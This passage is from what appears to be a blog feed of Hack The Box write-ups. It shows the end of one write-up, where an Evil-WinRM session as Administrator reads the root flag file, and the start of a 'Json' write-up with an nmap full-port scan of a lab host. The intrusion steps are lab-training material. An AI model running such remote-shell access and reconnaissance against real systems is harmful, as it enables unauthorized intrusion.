+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.9
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: undefined method <span style="color:#e6db74">`</span>quoting_detection_proc<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">for</span> module Reline
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt; type C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\r</span>oot.txt
+</span></span><span style="display:flex;"><span>4375a629c7c67c8e29db269060c955cb
 </span></span></code></pre></div>]]></content></item><item><title>HTB-Json Writeup</title><link>https://enilmalus.github.io/posts/htb-json-writeup/</link><pubDate>Sun, 01 Mar 2026 14:00:00 +0800</pubDate><guid>https://enilmalus.github.io/posts/htb-json-writeup/</guid><description>初始侦察 Nmap 端口扫描 ┌──(kali㉿kali)-[~/Work/Kali] └─$ sudo nmap --min-rate 10000 -p- 10.129.227.191 -oA port [sudo] password for kali: Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-01 01:13 EST Nmap scan report for 10.129.227.191 Host is up (0.10s latency). Not shown: 65521 closed tcp ports (reset) PORT STATE SERVICE 21/tcp open ftp 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 5985/tcp open wsman 47001/tcp open winrm 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49155/tcp open unknown 49156/tcp open unknown 49157/tcp open unknown 49158/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 11.</description><content type="html"><![CDATA[<h2 id="初始侦察">初始侦察</h2>
 <h3 id="nmap-端口扫描">Nmap 端口扫描</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
